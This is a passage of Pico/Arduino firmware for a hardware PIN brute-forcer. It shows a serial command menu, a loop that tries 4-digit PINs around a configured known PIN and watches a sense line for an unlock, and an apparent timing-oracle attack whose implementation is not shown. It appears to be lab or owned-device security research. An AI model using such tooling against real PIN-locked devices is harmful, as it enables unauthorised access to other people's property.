		Serial.printf("[run] %s sweep %04d..%04d, reset to %04d. 'g' to start.\r\n",
					  g_fullSweep ? "FULL" : "neighbourhood",
					  sweepStart(), sweepEnd(), g_attempt);
		break;
	case 'j':
	{
		long n = readNumberArg();
		if (n >= 0 && n <= 9999)
		{
			g_attempt = (int)n;
			g_believed = INITIAL_VALUE;
			Serial.printf("[run] jump -> %04d\r\n", g_attempt);
		}
		else
			Serial.println(F("[run] usage: j<0..9999>"));
	}
	break;
	case 'k':
		enterKnownPin(KNOWN_PIN);
		break;
	case 'e':
		SENSE_ENABLE = !SENSE_ENABLE;
		pinMode(PIN_SENSE, INPUT);
		Serial.printf("[cfg] SENSE=%s (Pico GP%d, active=%s)\r\n",
					  SENSE_ENABLE ? "ON" : "OFF", PIN_SENSE,
					  SENSE_ACTIVE_LEVEL == HIGH ? "HIGH" : "LOW");
		break;
	case 'o':
		oracleAttack();
		break;
	case 'm':
	{
		long n = readNumberArg();
		senseMonitor(n > 0 ? n : 3);
	}
	break;
	case 't':
	{
		long n = readNumberArg();
		thinkProbe(n >= 0 ? (int)n : KNOWN_PIN);
	}
	break;
	case 'B':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			ORACLE_BASE_MS = (uint32_t)n;
			Serial.printf("[cfg] oracle base=%lums\r\n", (unsigned long)ORACLE_BASE_MS);
		}
		else
			Serial.println(F("[cfg] usage: B<ms>"));
	}
	break;
	case 'S':
	{
		long n = readNumberArg();
		if (n >= 1)
		{
			ORACLE_STEP_MS = (uint32_t)n;
			Serial.printf("[cfg] oracle step=%lums\r\n", (unsigned long)ORACLE_STEP_MS);
		}
		else
			Serial.println(F("[cfg] usage: S<ms> (firmware sleep_ms per digit, ~50)"));
	}
	break;
	case '+':
		g_speedPct = min(SPEED_MAX_PCT, g_speedPct + 25);
		Serial.printf("[speed] %d%%\r\n", g_speedPct);
		break;
	case '-':
		g_speedPct = max(10, g_speedPct - 25);
		Serial.printf("[speed] %d%%\r\n", g_speedPct);
		break;
	case '?':
		printStatus();
		break;
	case 'h':
		printHelp();
		break;
	default:
		break; // ignore whitespace / unknown
	}
}

// --------------------------------- Setup -----------------------------------
void setup()
{
	pinMode(STATUS_LED, OUTPUT);
	digitalWrite(STATUS_LED, LOW);
	idleLines();
	if (SENSE_ENABLE)
		pinMode(PIN_SENSE, INPUT);

	Serial.begin(115200);
	unsigned long t0 = millis();
	while (!Serial && millis() - t0 < 3000) { /* wait briefly for USB CDC */ }

	g_believed = INITIAL_VALUE;
	g_attempt = sweepStart(); // begin in the neighbourhood of the known PIN
	printHelp();
	printStatus();
	Serial.printf("[ready] not running. Sweep window %04d..%04d (center %04d "
				  "+/-%d). Send 'g' to start.\r\n",
				  sweepStart(), sweepEnd(), SWEEP_CENTER, SWEEP_RADIUS);
}

// --------------------------------- Loop ------------------------------------
void loop()
{
	while (Serial.available())
		handleChar(Serial.read());

	if (!g_running)
	{
		digitalWrite(STATUS_LED, LOW);
		return;
	}
	if (g_attempt > sweepEnd())
	{
		g_running = false;
		idleLines();
		Serial.printf("[run] exhausted window %04d..%04d with no sensed unlock\r\n",
					  sweepStart(), sweepEnd());
		return;
	}

	digitalWrite(STATUS_LED, HIGH);
	int a = g_attempt;
	int d0 = a / 1000, d1 = (a / 100) % 10, d2 = (a / 10) % 10, d3 = a % 10;
	Serial.printf("[try] %d%d%d%d\r\n", d0, d1, d2, d3);

	bool unlocked = doAttempt(d0, d1, d2, d3);
	if (unlocked)
	{
		g_running = false;
		idleLines();
		Serial.printf("[FOUND] sensed unlock at PIN=%d%d%d%d\r\n", d0, d1, d2, d3);
		for (int i = 0; i < 20; i++)
		{
			digitalWrite(STATUS_LED, i & 1);
			delay(100);
		}
		return;
	}
	g_attempt++;
}
